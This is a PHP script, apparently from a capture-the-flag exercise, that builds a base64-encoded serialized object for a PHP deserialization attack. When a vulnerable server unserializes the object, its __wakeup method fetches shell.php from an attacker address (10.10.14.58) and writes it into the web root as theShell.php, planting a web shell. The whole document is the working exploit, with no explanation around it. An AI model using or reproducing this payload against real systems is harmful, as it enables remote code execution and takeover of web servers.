<?php
class Avatar {
    public $imgPath;

    public function __construct($imgPath) {
        $this->imgPath = $imgPath;
    }

    public function save($tmp) {
        $f = fopen($this->imgPath, "w");
        fwrite($f, file_get_contents($tmp));
        fclose($f);
    }
}

class AvatarInterface {
    public $tmp;
    public $imgPath; 

    public function __wakeup() {
        $a = new Avatar($this->imgPath);
        $a->save($this->tmp);
    }
}

$obj = new AvatarInterface();
$obj->tmp = 'http://10.10.14.58/shell.php';
$obj->imgPath = '/var/www/html/theShell.php';

echo base64_encode(serialize($obj));
?> 
